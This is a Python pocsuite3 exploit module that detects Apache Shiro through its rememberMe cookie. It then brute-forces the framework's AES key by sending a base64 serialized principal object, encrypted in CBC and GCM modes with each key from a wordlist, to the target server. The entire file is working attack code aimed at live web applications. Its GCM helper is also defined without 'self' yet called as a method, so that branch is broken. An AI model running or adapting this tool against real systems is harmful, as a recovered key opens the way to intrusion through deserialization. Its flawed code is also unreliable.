#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict, VUL_TYPE,
    random_str,
)
from pocsuite3.lib.core.data import paths
from Crypto.Cipher import AES
import uuid
import base64

requests.packages.urllib3.disable_warnings()
minimum_version_required('1.9.8')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = 'wuerror'
    vulDate = '2022-08-26'
    createDate = '2022-08-26'
    updateDate = '2022-08-26'
    references = []
    name = 'shiro_key_brute'
    appPowerLink = ''
    appName = 'shiro'
    appVersion = ''
    vulType = VUL_TYPE.BRUTE_FORCE
    desc = 'brute shiro key'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''


    def _options(self):
        opt = OrderedDict()
        opt["key"] = OptString(None, description='自定义shiro key')
        return opt

    def _exploit(self, head):
        r = requests.get(self.url, headers=head, verify=False, timeout=20, allow_redirects=False)
        if r.status_code == 405:
            r = requests.post(self.url, headers=head, allow_redirects=False, verify=False, timeout=20)
        resHeader = str(r.headers)
        if "=deleteMe" in resHeader:
            return True
        return False

    def _verify(self):
        """
        Check if it is a shiro framework
        """
        result = {}
        isExist = False
        flag = 'yes'
        head={
            'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;',
            'Cookie' : 'rememberMe={}'.format(flag)
            }
        if self._exploit(head):
            isExist = True
        else:
            #recheck
            randString = random_str(length=10)
            cookie = 'rememberMe={}'.format(randString)
            head.update({'Cookie': cookie})
            isExist = self._exploit(head)
        
        if isExist:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']["isShiro"] = "YES"
        return self.parse_output(result)

    def _attack(self):
        """
        brute force
        """
        result = {}
        tester = ShiroKey()
        enckey,encrypt_mode = None, None
        custom_key = self.get_option('key')
        if custom_key:
            enckey,encrypt_mode = tester.send_key(self.url, custom_key)
        else:
            enckey,encrypt_mode = tester.brute_keys(self.url)
        
        if enckey:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['key'] = enckey
            result['VerifyInfo']['mod'] = encrypt_mode
        return self.parse_output(result)

    def _shell(self):
        return self._verify()


class ShiroKey():
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    def __init__(self):
        self.keys = get_word_list()
        self.head={
            'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;',
            'Cookie' : 'rememberMe=Yes'
            }

    def encrypt_AES_GCM(msg, secretKey):
        aesCipher = AES.new(secretKey, AES.MODE_GCM)
        ciphertext, authTag = aesCipher.encrypt_and_digest(msg)
        return (ciphertext, aesCipher.nonce, authTag)
    
    def brute_keys(self, target):
        for key in self.keys:
            enckey,encrypt_mode = self.send_key(target, key)
            if enckey:
                return enckey,encrypt_mode

        return None, None
    
    def send_key(self, target, key):
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        file_body = base64.b64decode('rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==')
        # CBC加密
        encryptor = AES.new(base64.b64decode(key), self.mode, self.iv)
        base64_ciphertext = base64.b64encode(self.iv + encryptor.encrypt(pad(file_body)))
        cookie = 'rememberMe={}'.format(base64_ciphertext.decode())
        self.head.update({'Cookie': cookie})
        res = requests.get(target, headers=self.head,timeout=3,verify=False, allow_redirects=False)
        if res.headers.get("Set-Cookie") is None:
            return key, "cbc"
        else:
            if 'rememberMe=deleteMe;' not in res.headers.get("Set-Cookie"):
                return key, "cbc"
        # GCM加密
        encryptedMsg = self.encrypt_AES_GCM(file_body, base64.b64decode(key))
        base64_ciphertext = base64.b64encode(encryptedMsg[1] + encryptedMsg[0] + encryptedMsg[2])
        cookie = 'rememberMe={}'.format(base64_ciphertext.decode())
        self.head.update({'Cookie': cookie})
        res = requests.get(target, headers=self.head, timeout=3, verify=False, allow_redirects=False)

        if res.headers.get("Set-Cookie") is None:
            
            return key, "gcm"
        else:
            if 'rememberMe=deleteMe;' not in res.headers.get("Set-Cookie"):
                return key, "gcm"
        return None, None



def get_word_list():
    keys = list()
    with open(paths.SHIRO_KEYS) as f:
        for key in f:
            keys.append(key.strip())
        return keys

register_poc(DemoPOC)
